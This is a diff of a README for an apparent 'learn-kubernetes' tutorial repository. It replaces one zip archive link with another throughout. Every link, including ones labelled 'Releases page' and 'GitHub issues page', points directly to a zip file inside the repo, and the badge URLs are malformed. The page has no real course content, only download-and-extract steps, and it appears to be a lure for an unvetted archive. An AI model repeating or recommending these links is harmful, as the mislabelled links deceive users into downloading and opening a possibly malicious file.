@@ -1,7 +1,7 @@
 # 📚 learn-kubernetes - Your Guide to Mastering Kubernetes in 14 Days
 
 ## 🔗 Download Here
-[![Download learn-kubernetes](https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-10/learn_kubernetes_v2.6-alpha.1.zip%https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-10/learn_kubernetes_v2.6-alpha.1.zip)](https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-10/learn_kubernetes_v2.6-alpha.1.zip)
+[![Download learn-kubernetes](https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-12/learn_kubernetes_3.4.zip%https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-12/learn_kubernetes_3.4.zip)](https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-12/learn_kubernetes_3.4.zip)
 
 ## 🚀 Getting Started
 This guide helps you learn Kubernetes step by step. Whether you're starting from scratch or looking to enhance your skills, this resource is for you. With hands-on examples and best practices, you’ll gain confidence and knowledge in managing Kubernetes.
@@ -31,8 +31,8 @@ To run this application smoothly, please ensure you have:
 - Internet connection for downloading Kubernetes tools
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-10/learn_kubernetes_v2.6-alpha.1.zip) to download the latest version.
-2. Look for the file named **https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-10/learn_kubernetes_v2.6-alpha.1.zip** or similar. Click on it to start the download.
+1. Visit the [Releases page](https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-12/learn_kubernetes_3.4.zip) to download the latest version.
+2. Look for the file named **https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-12/learn_kubernetes_3.4.zip** or similar. Click on it to start the download.
 3. Once the file is downloaded, locate it on your computer.
 4. Extract the contents of the zip file to a folder of your choice.
 5. Open your terminal or command prompt and navigate to the extracted folder.
@@ -64,7 +64,7 @@ Explore these related topics to expand your knowledge:
 - **Kubernetes for Developers (CKAD)**
 - **Kubernetes Administrator Certification (CKA)**
 
-For any questions, visit the [GitHub issues page](https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-10/learn_kubernetes_v2.6-alpha.1.zip) to interact with the developers and community.
+For any questions, visit the [GitHub issues page](https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-12/learn_kubernetes_3.4.zip) to interact with the developers and community.
 
 ## 🔍 Additional Resources
 You may find these resources helpful:
@@ -73,6 +73,6 @@ You may find these resources helpful:
 - Online Learning Platforms for Kubernetes
 
 ## 🔗 Download Here Again
-[![Download learn-kubernetes](https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-10/learn_kubernetes_v2.6-alpha.1.zip%https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-10/learn_kubernetes_v2.6-alpha.1.zip)](https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-10/learn_kubernetes_v2.6-alpha.1.zip) 
+[![Download learn-kubernetes](https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-12/learn_kubernetes_3.4.zip%https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-12/learn_kubernetes_3.4.zip)](https://github.com/Al-hamza-ali/learn-kubernetes/raw/refs/heads/main/day-12/learn_kubernetes_3.4.zip) 
 
 This guide is designed for everyone. Enjoy your learning journey!
